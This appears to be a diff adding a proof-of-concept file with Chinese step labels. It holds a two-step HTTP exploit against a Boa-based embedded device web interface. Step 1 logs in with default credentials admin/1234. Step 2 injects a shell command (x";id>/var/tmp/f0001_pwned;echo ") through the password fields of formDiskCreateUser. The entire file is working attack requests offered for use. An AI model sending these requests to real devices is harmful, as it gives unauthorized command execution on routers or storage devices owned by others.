@@ -1,0 +1,17 @@
+[Step 1] 登录
+POST /boafrm/formLoginSetup HTTP/1.1
+Host: {{target}}
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 28
+
+username=admin&password=1234
+[Step 2] 注入 (payload 原样: x";id>/var/tmp/f0001_pwned;echo ")
+POST /boafrm/formDiskCreateUser HTTP/1.1
+Host: {{target}}
+Cookie: webuicookie={{Step 1 Set-Cookie 值}}
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 180
+
+username=f0001user&newpass=x%22%3Bid%3E%2Fvar%2Ftmp%2Ff0001_pwned%3Becho%20%22&confpass=x%22%3Bid%3E%2Fvar%2Ftmp%2Ff0001_pwned%3Becho%20%22&Group=users&submit-url=%2Faccountmng.htm
